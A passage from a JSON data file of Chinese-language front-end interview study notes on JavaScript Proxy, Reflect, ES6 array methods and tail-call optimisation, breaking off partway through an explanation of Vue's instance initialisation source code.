    "exerciseKeyList": "[\"82d187ea-2abe-4ad5-bffc-429098f18d25\",\"6d66ddb0-f53a-4286-b5e1-bf7ca3bcd34e\",\"d09f473f-e37f-4d6b-8208-2a0be8f87de7\",\"09420ad4-4cd0-4c3d-9b56-970e21c8f208\",\"70db8e81-b858-4f3a-8bf9-d2bd1eb142e2\",\"cf173a5c-bf67-4121-ad14-ed7404bc77a4\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:12:17.000Z",
    "updateAt": "2025-07-17T15:07:36.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "09420ad4-4cd0-4c3d-9b56-970e21c8f208",
        "title": "谈谈 Object.defineProperty 与 Proxy 的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-07T08:36:38.000Z",
        "updateAt": "2024-08-10T17:05:38.000Z"
      },
      {
        "exerciseKey": "6d66ddb0-f53a-4286-b5e1-bf7ca3bcd34e",
        "title": "如何让 Proxy 去监听基本数据类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:09:00.000Z",
        "updateAt": "2024-07-19T08:52:01.000Z"
      },
      {
        "exerciseKey": "70db8e81-b858-4f3a-8bf9-d2bd1eb142e2",
        "title": "你是怎么理解ES6中Proxy的？使用场景有哪些?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:37:50.000Z",
        "updateAt": "2024-07-20T09:39:21.000Z"
      },
      {
        "exerciseKey": "82d187ea-2abe-4ad5-bffc-429098f18d25",
        "title": "Proxy 和 Object.defineProperty 的区别是啥？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:08:10.000Z"
      },
      {
        "exerciseKey": "cf173a5c-bf67-4121-ad14-ed7404bc77a4",
        "title": "Vue3.0里为什么要用 Proxy API 替代 defineProperty API ？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:54:01.000Z",
        "updateAt": "2024-08-10T17:04:51.000Z"
      },
      {
        "exerciseKey": "d09f473f-e37f-4d6b-8208-2a0be8f87de7",
        "title": "Proxy 能够监听到对象中的对象的引用吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:03:02.000Z",
        "updateAt": "2024-08-10T17:07:31.000Z"
      }
    ]
  },
  "61": {
    "id": 61,
    "tagId": 24,
    "title": "Reflect",
    "explanation": "### 一、Reflect有什么用？\n\n一句话，Reflect没什么用，除了装装逼，让人看起来高大上以外，并不具有什么牛逼之处。\n\n准确讲应该是这样的，Reflect更像是一种语法变体，其挂在的所有方法都能找到对应的原始语法，也就是Reflect的替代性非常强。\n\n其实从Reflect这个单词本身字面意思就能体会出Reflect的神韵，Reflect的中文意思是“反射”，阳光照在镜子上反射，其实光子还是那些光子，只是变化了方向。\n\n举例说明：\n\nReflect对象挂载了很多静态方法，所谓静态方法，就是和`Math.round()`这样，不需要new就可以直接使用的方法。\n\n比较常用的两个方法就是`get()`和`set()`方法：\n\n```js\nReflect.get(target, propertyKey\\[, receiver\\])\nReflect.set(target, propertyKey, value\\[, receiver\\])\n```\n\n就作用而言，等同于：\n\n```js\ntarget[propertyKey]\ntarget[propertyKey] = value;\n```\n\n比方说页面上有个输入框，其DOM对象变量是`input`，平时我们对整个输入框赋值使用的语句多半是：\n\n```js\ninput.value = 'zhangxinxu';\n```\n\n就可以直接使用`Reflect.set()`方法代替：\n\n```js\nReflect.set(input, 'value', 'zhangxinxu')\n```\n\n效果是一模一样的。\n\n又例如，我们希望对`input`的`value`属性重新定义，使该输入框`value`属性发生变化的时候可以同时触发`'change'`事件，下面是使用大家普遍比较熟悉的`Object.defineProperty()`方法实现的示意：\n\n```js\nconst props = Object.getOwnPropertyDescriptor(input, 'value');\nObject.defineProperty(input, 'value', {\n    ...props,\n    set (v) {\n        let oldv = this.value;\n        props.set.call(this, v);\n        // 手动触发change事件\n        if (oldv !== v) {\n            this.dispatchEvent(new CustomEvent('change'));\n        }\n    }\n});\n```\n\n\n上述代码我们完全可以使用Reflect对象实现，具体的JavaScript代码如下所示。\n\n```js\nconst props = Reflect.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');\nReflect.defineProperty(input, 'value', {\n    ...props,\n    set (v) {\n        let oldv = this.value;\n        props.set.call(this, v);\n        // 手动触发change事件\n        if (oldv !== v) {\n            this.dispatchEvent(new CustomEvent('change'));\n        }\n    }\n});\n```\n\n我们可以测试下，假设页面HTML如下：\n\n```html\n<input id=\"input\">\n```\n\n测试代码为：\n\n```js\ninput.addEventListener('change', () => {\n  document.body.append('变化啦~');\n});\n\ninput.value = 'zhangxinxu';\n```\n\n此时，就可以看到页面上出现了“变化啦~”文字\n\n### 二、细微差异-返回值\n\n事物存在必有道理，如果Reflect仅仅是换了种语法，存在的意义并不大，很显然，Reflect对象的出现必然有其他的考量。\n\n我认为其中有意义的一点就是返回值。\n\n对于某个对象，赋值并不总是成功的。\n\n例如，我们把 `input` 的`type`属性设置为只读，如下：\n\n```js\nObject.defineProperty(input, 'type', {\n    get () {\n       return this.getAttribute('type') || 'text';\n    }\n});\n```\n\n传统的使用等于号进行的属性赋值并不能知道最后是否执行成功，需要开发者自己进行进一步的检测。\n\n例如：\n\n```js\nconsole.log(input.type = 'number');\n\n// 输出 false\nconsole.log(Reflect.set(input, 'type', 'number'));\n```\n\n上面一行赋值返回值是`'number'`，至于改变输入框的`type`属性值是否成功，不得而知。\n\n但是下面一行语句使用的`Reflect.set()`方法，就可以知道是否设置成功，因为`Reflect.set()`的返回值是`true`或者`false`（只要参数类型准确）。\n\n除了知道执行结果外，Reflect方法还有个好处，不会因为报错而中断正常的代码逻辑执行。\n\n例如下面的代码：\n\n```js\n(function () {\n    'use strict';\n\n    var frozen = { 1: 81 };\n    Object.freeze(frozen);\n\n    frozen\\[1\\] = 'zhangxinxu';\n\n    console.log('no log');\n})();\n```\n\n会出现下面的TypeError错误：\n\n> Uncaught TypeError: Cannot assign to read only property ‘1’ of object ‘#`<Object>`’\n\n后面的语句`console.log('no log')`就没有被执行。\n\n但是如果使用Reflect方法，则console语句是可以执行的，例如：\n\n```js\n(function () {\n    'use strict';\n\n    var frozen = { 1: 81 };\n    Object.freeze(frozen);\n\n    Reflect.set(frozen, '1', 'zhangxinxu');\n\n    console.log('no log');\n})();\n```\n\n控制台运行后的log输出值如下图所示：\n\n![log正常执行了](https://static.ecool.fun//article/2bb1c03c-1a43-467c-b78f-a780a73a845e.png)\n\n### 三、set、get方法中的receiver参数\n\n就功能而言，`Reflect.get()`和`Reflect.set()`方法和直接对象赋值没有区别，都是可以互相替代的，例如，下面两段JS效果都是一样的。\n\n还是使用`input`这个DOM元素示意。\n\n有人可能会疑问，为什么不用纯对象示意呢？\n\n因为我发现大多数前端都对DOM不怎么感兴趣，那我就反其道行之，故意膈应人。另外一个原因就是DOM对象更具象，所见即所得，适合偏感性的同学的学习。\n\n```js\nconst xyInput = new Proxy(input, {\n    set (target, prop, value) {\n        if (prop == 'value') {\n            target.dispatchEvent(new CustomEvent('change'));\n        }\n        target\\[prop\\] = value;\n\n        return true;\n    },\n    get (target, prop) {\n        return target[prop];\n    }\n});\n\ninput.addEventListener('change', () => {\n  document.body.append('变化啦~');\n});\nxyInput.value = 'zhangxinxu';\n```\n\n和下面的JS代码效果类似的。\n\n```js\nconst xyInput = new Proxy(input, {\n    set (target, prop, value) {\n        if (prop == 'value') {\n            target.dispatchEvent(new CustomEvent('change'));\n        }\n        return Reflect.set(target, prop, value);\n    },\n    get (target, prop) {\n        return Reflect.get(target, prop);\n    }\n});\n\ninput.addEventListener('change', () => {\n  document.body.append('变化啦~');\n});\nxyInput.value = 'zhangxinxu';\n```\n\n均有如下图所示的效果：\n\n![Reflect与value赋值](https://static.ecool.fun//article/637ac5d0-afe0-45cd-b740-d7b4b7687da4.png)\n\n但是，当需要使用可选参数receiver参数的时候，直接对象赋值和使用Reflect赋值就会出现差异。\n\n首先，对于DOM元素，应用receiver参数会报错。\n\n例如下面的JS就会报错：\n\n```\nReflect.set(input, 'value', 'xxx', new Proxy({}, {}));\n```\n\n> Uncaught TypeError: Illegal invocation\n\n但是把input换成普通的纯对象，则不会有问题，例如：\n\n```\n// 可以正常执行\nReflect.set({}, 'value', 'xxx', new Proxy({}, {}));\n```\n\n#### 关于receiver参数\n\n说了这么多，`receiver`参数到底是干嘛用的呢？\n\nreceiver是接受者的意思，表示调用对应属性或方法的主体对象，通常情况下，receiver参数是无需使用的，但是如果发生了继承，为了明确调用主体，receiver参数就需要出马了。\n\n比方说下面这个例子：\n\n```\nlet miaoMiao = {\n  _name: '疫苗',\n  get name () {\n    return this._name;\n  }\n}\nlet miaoXy = new Proxy(miaoMiao, {\n  get (target, prop, receiver) {\n    return target\\[prop\\];\n  }\n});\n\nlet kexingMiao = {\n  __proto__: miaoXy,\n  _name: '科兴疫苗'\n};\n\n// 结果是疫苗\nconsole.log(kexingMiao.name);\n```\n\n实际上，这里预期显示应该是“科兴疫苗”，而不是“疫苗”。\n\n这个时候，就需要使用`receiver`参数了，代码变化部分参见下面标红的那一行：\n\n```\nlet miaoMiao = {\n  _name: '疫苗',\n  get name () {\n    return this.\\_name;\n  }\n}\nlet miaoXy = new Proxy(miaoMiao, {\n  get (target, prop, receiver) {\n    return Reflect.get(target, prop, receiver);\n    // 也可以简写为 Reflect.get(...arguments) \n  }\n});\n\nlet kexingMiao = {\n  __proto__: miaoXy,\n  _name: '科兴疫苗'\n};\n\n// 结果是科兴疫苗 \nconsole.log(kexingMiao.name);\n```\n\n\n\n这就是receiver参数的作用，可以把调用对象当作target参数，而不是原始Proxy构造的对象。\n\n### 四、其他以及结束语\n\nReflect对象经常和Proxy代理一起使用，原因有三点：\n\n1.  Reflect提供的所有静态方法和Proxy第2个handle参数方法是一模一样的。具体见后面的对比描述。\n2.  Proxy get/set()方法需要的返回值正是Reflect的get/set方法的返回值，可以天然配合使用，比直接对象赋值/获取值要更方便和准确。\n3.  receiver参数具有不可替代性。\n\n下表是自己整理的Reflect静态方法和对应的其他函数或功能符。\n\n| Reflect方法 | 类似于 |\n| --- | --- |\n| Reflect.apply(target, thisArgument, argumentsList) | Function.prototype.apply() |\n| Reflect.construct(target, argumentsList\\[, newTarget\\]) | new target(…args) |\n| Reflect.defineProperty(target, prop, attributes) | Object.defineProperty() |\n| Reflect.deleteProperty(target, prop) | delete target\\[name\\] |\n| Reflect.get(target, prop\\[, receiver\\]) | target\\[name\\] |\n| Reflect.getOwnPropertyDescriptor(target, prop) | Object.getOwnPropertyDescriptor() |\n| Reflect.getPrototypeOf(target) | Object.getPrototypeOf() |\n| Reflect.has(target, prop) | in 运算符 |\n| Reflect.isExtensible(target) | Object.isExtensible() |\n| Reflect.ownKeys(target) | Object.keys() |\n| Reflect.preventExtensions(target) | Object.preventExtensions() |\n| Reflect.set(target, prop, value\\[, receiver\\]) | target\\[prop\\] = value |\n| Reflect.setPrototypeOf(target, prototype) | Object.setPrototypeOf() |\n\n正是人如其名，Reflect就是其他方法、操作符的“反射”。\n",
    "testPoint": "在 ES6 中，`Reflect` 是一个内置对象，提供了用于操作对象的**低级 API**，它和 `Proxy` 密切相关。可以把 `Reflect` 理解为“更规范、更一致的对象操作工具集合”，本质上是对 JS 原有的底层操作（如 `delete`、`Object.defineProperty`）的一种函数化封装。\n\n## 一、`Reflect` 的核心作用\n\n| 功能             | 说明                                     |\n| -------------- | -------------------------------------- |\n| 函数化的对象操作       | 将原本非函数形式的操作（如 `delete obj.key`）封装为函数调用 |\n| 与 `Proxy` 配合使用 | Proxy handler 中经常使用 Reflect 来执行默认行为    |\n| 统一错误处理         | `Reflect` 方法失败时返回 `false`，而不是抛出异常      |\n| 更语义化           | 代码更直观易懂，行为更一致                          |\n\n\n## 二、常用 API（共 13 个）\n\n```js\nconst obj = { a: 1 };\n\n// 获取属性\nReflect.get(obj, 'a');                 // 1\n\n// 设置属性\nReflect.set(obj, 'b', 2);              // true\n\n// 判断属性是否存在\nReflect.has(obj, 'a');                 // true（等价于 'a' in obj）\n\n// 删除属性\nReflect.deleteProperty(obj, 'a');      // true\n\n// 获取属性描述符\nReflect.getOwnPropertyDescriptor(obj, 'b');\n\n// 定义属性（类似 Object.defineProperty）\nReflect.defineProperty(obj, 'c', {\n  value: 3,\n  writable: true,\n  configurable: true,\n  enumerable: true,\n});\n\n// 获取所有自有属性键\nReflect.ownKeys(obj);                  // 包括 symbol 键\n\n// 获取原型\nReflect.getPrototypeOf(obj);\n\n// 设置原型\nReflect.setPrototypeOf(obj, Array.prototype);\n\n// 阻止扩展\nReflect.preventExtensions(obj);\n\n// 判断是否可扩展\nReflect.isExtensible(obj);\n\n// 构造对象（类似 new）\nReflect.construct(Date, []);\n\n// 函数调用（类似 Function.prototype.apply）\nReflect.apply(Math.max, null, [1, 5, 3]); // 5\n```\n\n\n## 三、与 `Object` 的对比考点\n\n| 操作     | Object 风格                    | Reflect 风格                          |\n| ------ | ---------------------------- | ----------------------------------- |\n| 获取原型   | `Object.getPrototypeOf(obj)` | `Reflect.getPrototypeOf(obj)`       |\n| 设置属性   | `obj[prop] = val`            | `Reflect.set(obj, prop, val)`       |\n| 删除属性   | `delete obj[prop]`           | `Reflect.deleteProperty(obj, prop)` |\n| 定义属性   | `Object.defineProperty(...)` | `Reflect.defineProperty(...)`       |\n| 调用构造函数 | `new Foo(...args)`           | `Reflect.construct(Foo, args)`      |\n\nReflect 的方法返回值更一致，错误处理更温和（通常返回 `false` 而不是抛出异常），利于流程控制。\n\n\n## 四、与 Proxy 的结合\n\n在 `Proxy` handler 中使用 `Reflect` 是**最佳实践**：\n\n```js\nconst target = { name: 'Tom' };\nconst proxy = new Proxy(target, {\n  get(target, key, receiver) {\n    console.log('get:', key);\n    return Reflect.get(target, key, receiver);\n  },\n  set(target, key, value, receiver) {\n    console.log('set:', key, value);\n    return Reflect.set(target, key, value, receiver);\n  },\n});\n```\n\n* 使用 Reflect 确保操作行为与原生保持一致（如返回值、原型链处理等）。\n* 避免意外行为或性能问题。\n\n## 五、实际开发中的使用场景\n\n* **代理数据拦截时实现默认行为（与 Proxy 搭配）**\n* **函数调用封装（如 Reflect.apply）**\n* **实现类的继承时通过 Reflect.construct 构造子类实例**\n* **精确控制对象属性定义和拦截**",
    "exerciseKeyList": "[\"18682a73-0c4e-4859-96fd-2a6fde7587b7\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:17:23.000Z",
    "updateAt": "2025-07-17T15:12:58.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "18682a73-0c4e-4859-96fd-2a6fde7587b7",
        "title": "ES6中的 Reflect 对象有什么用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-31T13:45:11.000Z",
        "updateAt": "2024-08-10T17:05:36.000Z"
      }
    ]
  },
  "62": {
    "id": 62,
    "tagId": 24,
    "title": "数组扩展",
    "explanation": "ES6（ECMAScript 2015）为JavaScript数组引入了多项扩展功能，这些功能不仅简化了数组操作，还提高了代码的可读性和效率。本文将详细介绍ES6数组扩展的主要功能和用法。\n\n#### 一、扩展运算符（...）\n\n扩展运算符可以用于数组的赋值、合并、解构赋值以及将字符串转为数组。\n\n1. **赋值数组**：\n   ```javascript\n   let arr1 = [100, 200, 300, [500]];\n   let arr2 = [...arr1]; // 浅拷贝\n   console.log(arr2 == arr1); // false\n   arr1[0] = 400;\n   console.log(arr2); // 不受影响\n   arr1[3][0] = 600;\n   console.log(arr2); // 受影响（只拷贝了一层）\n   ```\n\n2. **合并数组**：\n   ```javascript\n   console.log([...[1, 2, 3], ...[4, 5, 6]]); // [1, 2, 3, 4, 5, 6]\n   ```\n\n3. **解构赋值**：\n   ```javascript\n   let [a, ...list] = [1, ...[\"a\", \"b\"]];\n   console.log(a); // 1\n   console.log(list); // [\"a\", \"b\"]\n   ```\n\n4. **将字符串转为数组**：\n   ```javascript\n   console.log([...\"str\"]); // [\"s\", \"t\", \"r\"]\n   ```\n\n#### 二、Array.from()\n\n`Array.from()`方法用于将类数组对象或可迭代对象转换为真正的数组。\n\n```javascript\nlet arrLike = {\n  \"0\": \"内容\",\n  \"1\": \"内容2\",\n  \"2\": \"内容3\",\n  length: 3\n};\nconsole.log(Array.from(arrLike)); // [\"内容\", \"内容2\", \"内容3\"]\n```\n\n此外，`Array.from()`还可以接受一个回调函数，用于对数组中的每个元素进行处理。\n\n```javascript\nlet arr = Array.from({ length: 2 }, () => \"jack\");\nconsole.log(arr); // [\"jack\", \"jack\"]\n```\n\n#### 三、Array.of()\n\n`Array.of()`方法用于将一组值转换为数组，与Array构造函数的行为不同，Array.of()不会把一个参数作为数组的长度。\n\n```javascript\nconsole.log(Array.of(1, 2, \"内容\")); // [1, 2, \"内容\"]\nconsole.log(Array.of(3)); // [3]\n```\n\n#### 四、copyWithin()\n\n`copyWithin()`方法用于复制数组的一部分到同一数组中的另一个位置，并返回这个数组。它不会改变数组的长度。\n\n```javascript\nlet arr = [1, 2, 3, 4, 5];\nconsole.log(arr.copyWithin(2)); // [1, 2, 1, 2, 3]\nconsole.log(arr.copyWithin(2, 1)); // [1, 2, 2, 1, 2]\nconsole.log(arr.copyWithin(2, 1, 3)); // [1, 2, 2, 2, 2]\n```\n\n#### 五、fill()\n\n`fill()`方法用于用一个静态值填充一个数组从起始索引到终止索引内的全部元素。不包括终止索引。\n\n```javascript\nlet arr = [1, 2, 3, 4, 5];\nconsole.log(arr.fill(\"a\")); // [\"a\", \"a\", \"a\", \"a\", \"a\"]\nconsole.log(arr.fill(\"a\", 0, 1)); // [\"a\", 2, 3, 4, 5]\n```\n\n#### 六、find() 和 findIndex()\n\n`find()`方法返回数组中满足提供的测试函数的第一个元素的值。否则返回undefined。\n\n```javascript\nlet arr = [1, 2, 3, 4, 5];\nconsole.log(arr.find(a => a > 2)); // 3\n```\n\n`findIndex()`方法返回数组中满足提供的测试函数的第一个元素的索引。否则返回-1。\n\n```javascript\nlet arr = [1, 2, 3, 4, 5];\nconsole.log(arr.findIndex(a => a > 2)); // 2\n```\n\n#### 七、includes()\n\n`includes()`方法用来判断一个数组是否包含一个指定的值，根据情况返回true或false。\n\n```javascript\nlet arr = [\"苹果\", \"橘子\", \"香蕉\"];\nconsole.log(arr.includes(\"橘子\")); // true\n```\n\n#### 八、flat() 和 flatMap()\n\n`flat()`方法用于将嵌套的数组“拉平”成一维数组。可以传入一个参数指定拉平的层数。\n\n```javascript\nlet arr = [1, 2, [3, [4, 5]]];\nconsole.log(arr.flat(2)); // [1, 2, 3, 4, 5]\n```\n\n`flatMap()`方法首先使用映射函数映射每个元素，然后将结果展平成一个新数组。\n\n```javascript\nlet arr = [{ name: \"A\", list: [\"安庆\", \"安阳\", \"鞍山\"] }, { name: \"B\", list: [\"北京\", \"保定\", \"包头\"] }];\nlet res = arr.flatMap(function(item) {\n  return item.list;\n});\nconsole.log(res); // [\"安庆\", \"安阳\", \"鞍山\", \"北京\", \"保定\", \"包头\"]\n```\n\n#### 九、遍历方法\n\n- `keys()`：返回数组索引的迭代器。\n- `values()`：返回数组元素的迭代器。\n- `entries()`：返回数组的键值对迭代器。\n\n```javascript\nlet arr = [100, 200, 300, 400, 500];\nfor (const [index, value] of arr.entries()) {\n  console.log(value, index);\n}\n```\n\n#### 十、其他方法\n\n- `at()`：返回指定位置的元素，允许使用负数索引从数组末尾开始计数。\n- `toReversed()`：返回一个新数组，该数组是原数组的反转副本。\n- `toSorted()`（假设为`sort()`的扩展说明）：用于对数组的元素进行排序。\n- `toSpliced()`（假设为`splice()`的扩展说明）：用于添加/删除数组的元素，并返回被删除的元素。\n",
    "testPoint": "\n1. **扩展运算符**：\n   - 用途：数组转参数、数组复制、数组合并、字符串转数组。\n   - 注意：浅拷贝。\n\n2. **Array.from()**：\n   - 用途：类数组对象、可迭代对象转数组。\n   - 参数：可传入处理函数。\n\n3. **Array.of()**：\n   - 用途：一组值转数组。\n   - 注意：无参数时返回空数组。\n\n4. **copyWithin()**：\n   - 用途：数组内部复制元素。\n   - 参数：target（目标起始索引）、start（起始位置）、end（结束位置，不包括）。\n\n5. **find() 和 findIndex()**：\n   - 用途：查找符合条件的元素或索引。\n   - 参数：回调函数（可绑定this）。\n\n6. **fill()**：\n   - 用途：用给定值填充数组。\n   - 参数：值、起始索引、结束索引（不包括）。\n\n7. **keys()、values()、entries()**：\n   - 用途：遍历数组键名、键值、键值对。\n\n8. **解构赋值**：\n   - 用途：从数组或对象中提取值进行变量赋值。\n\n9. **for...of循环**：\n   - 用途：遍历数组、Set、Map、类数组对象、对象和字符串。\n\n",
    "exerciseKeyList": "[\"4a0df14c-048b-47cc-a18f-1c9b36f54e90\",\"943c425e-0b59-4ef6-b22d-6596c19a962a\",\"f56b93a9-52df-49ae-8d63-d7ee4f816f8b\",\"4af06e53-d9ca-4a28-8067-d4ffc3691827\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:23:37.000Z",
    "updateAt": "2025-07-17T15:13:17.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4a0df14c-048b-47cc-a18f-1c9b36f54e90",
        "title": "ES6中数组新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:35:15.000Z",
        "updateAt": "2024-07-22T15:41:11.000Z"
      },
      {
        "exerciseKey": "4af06e53-d9ca-4a28-8067-d4ffc3691827",
        "title": "类数组转化为数组",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:58:56.000Z",
        "updateAt": "2021-07-07T00:12:37.000Z"
      },
      {
        "exerciseKey": "943c425e-0b59-4ef6-b22d-6596c19a962a",
        "title": "哪些方法修改了原数组?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2021-07-03T22:29:14.000Z"
      },
      {
        "exerciseKey": "f56b93a9-52df-49ae-8d63-d7ee4f816f8b",
        "title": "数组去重",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:57:47.000Z",
        "updateAt": "2021-07-07T00:12:34.000Z"
      }
    ]
  },
  "63": {
    "id": 63,
    "tagId": 24,
    "title": "尾部优化",
    "explanation": "ES6 引入了**尾调用优化（Tail Call Optimization，TCO）**的规范，但它的实现依赖于 **JavaScript 引擎的支持**（比如 V8 并未开启 TCO），所以这是一个**理论上重要、实践中需要谨慎对待**的考点。\n\n\n## 一、什么是尾调用（Tail Call）？\n\n尾调用是指：\n\n> **函数的最后一步是调用另一个函数**，并直接返回这个函数的执行结果。\n\n例如：\n\n```js\nfunction foo() {\n  return bar(); // bar 是 foo 的尾调用\n}\n```\n\n尾调用意味着：\n\n* 当前函数的**调用栈帧**不需要再做任何事。\n* 调用栈可以复用，**不需要为当前函数保留栈帧**，从而节省内存。\n\n\n## 二、什么是尾调用优化（TCO）？\n\n尾调用优化的目标是：\n\n> 当一个函数的最后一步是调用另一个函数，JS 引擎可以不再保留当前函数的调用记录，**直接跳转执行被调用函数，复用当前栈帧**。\n\n也就是说：\n\n* 不会形成函数调用嵌套的“栈帧链”；\n* 可以避免**函数递归导致的栈溢出（stack overflow）**。\n\n\n## 三、尾调用成立的条件\n\n必须同时满足以下三个条件：\n\n| 条件            | 说明                                      |\n| ------------- | --------------------------------------- |\n| 1. 在严格模式下     | TCO 只在 strict mode 下才可能被引擎开启            |\n| 2. 是函数的最后一步调用 | return 后没有任何操作                          |\n| 3. 返回调用结果     | return bar(x) 形式，不能是 `bar(x); return y` |\n\n✅ 尾调用示例：\n\n```js\n'use strict';\nfunction f(x) {\n  return g(x); // 最后一步是返回 g(x)，符合尾调用优化条件\n}\n```\n\n❌ 非尾调用：\n\n```js\nfunction f(x) {\n  const y = g(x);\n  return y; // 不是直接返回函数调用\n}\n```\n\n---\n\n## 四、尾调用优化应用场景：**尾递归**\n\n递归调用时，若能做到尾调用，就能避免栈溢出。\n\n### 普通递归（可能爆栈）：\n\n```js\nfunction factorial(n) {\n  if (n <= 1) return 1;\n  return n * factorial(n - 1);\n}\n```\n\n### 尾递归（理论上支持 TCO 时不会爆栈）：\n\n```js\n'use strict';\nfunction factorial(n, acc = 1) {\n  if (n <= 1) return acc;\n  return factorial(n - 1, acc * n);\n}\n```\n\n---\n\n## 五、实际支持情况\n\n| JS 引擎     | 是否支持 TCO（尾调用优化）  |\n| --------- | ---------------- |\n| Chrome/V8 | ❌ 不支持（曾尝试过，后移除）  |\n| Safari    | ✅ 支持（唯一支持的主流浏览器） |\n| Firefox   | ❌ 不支持            |\n| Node.js   | ❌ 不支持（基于 V8）     |\n\n所以在 **现代实际开发中无法依赖 TCO**，需要手动优化递归为循环等。\n\n---\n\n## 六、替代策略（在不支持 TCO 的场景下）\n\n* 使用 `while`/`for` 替代递归\n* 显式使用栈模拟递归过程\n* 使用尾递归 + 手动转换为 trampoline 技术（“跳板函数”）\n\n示例 trampoline 技术（仅作了解）：\n\n```js\nfunction trampoline(fn) {\n  while (typeof fn === 'function') {\n    fn = fn();\n  }\n  return fn;\n}\n\nfunction sum(n, acc = 0) {\n  if (n <= 0) return acc;\n  return () => sum(n - 1, acc + n);\n}\n\ntrampoline(() => sum(100000)); // 不会爆栈\n```\n\n## 七、总结\n\n| 特性     | 说明                              |\n| ------ | ------------------------------- |\n| 本质     | 栈帧复用，节省调用栈                      |\n| 条件     | 严格模式 + return 语句 + 最后一步调用       |\n| 适用场景   | 递归函数调用优化、避免栈溢出                  |\n| 实际支持情况 | Safari 支持，其他主流浏览器和 Node.js 暂不支持 |\n| 实际开发建议 | 写尾递归是良好习惯，但仍建议控制递归深度或用迭代优化      |\n\n即便当前 TCO 没有广泛实现，**尾调用思想仍是编程中节省资源、控制堆栈的有效技巧**，是中高级前端面试中的延伸考察点。\n",
    "testPoint": "1. 什么是尾调用？尾调用优化有什么好处？\n2. 尾调用优化需要满足哪些条件？\n3. 为什么尾递归比普通递归更安全？\n4. JS 引擎是否支持尾调用优化？有哪些局限？\n5. 如何手动优化递归，避免栈溢出？",
    "exerciseKeyList": "[\"246fb719-7819-481e-943d-480a219e29b4\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:32:04.000Z",
    "updateAt": "2025-07-17T15:15:55.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "246fb719-7819-481e-943d-480a219e29b4",
        "title": "什么是尾调用优化和尾递归？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-31T11:59:59.000Z",
        "updateAt": "2024-08-10T17:05:35.000Z"
      }
    ]
  },
  "64": {
    "id": 64,
    "tagId": 14,
    "title": "Vue实例挂载",
    "explanation": "### **一、思考**\n\n我们都听过知其然知其所以然这句话\n\n那么不知道大家是否思考过`new Vue()`这个过程中究竟做了些什么？\n\n过程中是如何完成数据的绑定，又是如何将数据渲染到视图的等等\n\n### **一、分析**\n\n首先找到`vue`的构造函数\n\n源码位置：src\\\\core\\\\instance\\\\index.js\n\n```javascript\nfunction Vue (options) {\n  if (process.env.NODE_ENV !== 'production' &&\n    !(this instanceof Vue)\n  ) {\n    warn('Vue is a constructor and should be called with the `new` keyword')\n  }\n  this._init(options)\n}\n\n```\n\n`options`是用户传递过来的配置项，如`data、methods`等常用的方法\n\n`vue`构建函数调用`_init`方法，但我们发现本文件中并没有此方法，但仔细可以看到文件下方定定义了很多初始化方法\n\n```javascript\ninitMixin(Vue);     // 定义 _init\nstateMixin(Vue);    // 定义 $set $get $delete $watch 等\neventsMixin(Vue);   // 定义事件  $on  $once $off $emit\nlifecycleMixin(Vue);// 定义 _update  $forceUpdate  $destroy\nrenderMixin(Vue);   // 定义 _render 返回虚拟dom\n\n```\n\n首先可以看`initMixin`方法，发现该方法在`Vue`原型上定义了`_init`方法\n\n源码位置：src\\\\core\\\\instance\\\\init.js\n\n```javascript\nVue.prototype._init = function (options?: Object) {\n    const vm: Component = this\n    // a uid\n    vm._uid = uid++\n    let startTag, endTag\n    /* istanbul ignore if */\n    if (process.env.NODE_ENV !== 'production' && config.performance && mark) {\n      startTag = `vue-perf-start:${vm._uid}`\n      endTag = `vue-perf-end:${vm._uid}`\n      mark(startTag)\n    }\n\n    // a flag to avoid this being observed\n    vm._isVue = true\n    // merge options\n    // 合并属性，判断初始化的是否是组件，这里合并主要是 mixins 或 extends 的方法\n    if (options && options._isComponent) {\n      // optimize internal component instantiation\n      // since dynamic options merging is pretty slow, and none of the\n      // internal component options needs special treatment.\n      initInternalComponent(vm, options)\n    } else { // 合并vue属性\n      vm.$options = mergeOptions(\n        resolveConstructorOptions(vm.constructor),\n        options || {},\n        vm\n      )\n    }\n    /* istanbul ignore else */\n    if (process.env.NODE_ENV !== 'production') {\n      // 初始化proxy拦截器\n      initProxy(vm)\n    } else {\n      vm._renderProxy = vm\n    }\n    // expose real self\n    vm._self = vm\n    // 初始化组件生命周期标志位\n    initLifecycle(vm)\n    // 初始化组件事件侦听\n    initEvents(vm)\n    // 初始化渲染方法\n    initRender(vm)\n    callHook(vm, 'beforeCreate')\n    // 初始化依赖注入内容，在初始化data、props之前\n    initInjections(vm) // resolve injections before data/props\n    // 初始化props/data/method/watch/methods\n    initState(vm)\n    initProvide(vm) // resolve provide after data/props\n    callHook(vm, 'created')\n\n    /* istanbul ignore if */\n    if (process.env.NODE_ENV !== 'production' && config.performance && mark) {\n      vm._name = formatComponentName(vm, false)\n      mark(endTag)\n      measure(`vue ${vm._name} init`, startTag, endTag)\n    }\n    // 挂载元素\n    if (vm.$options.el) {\n      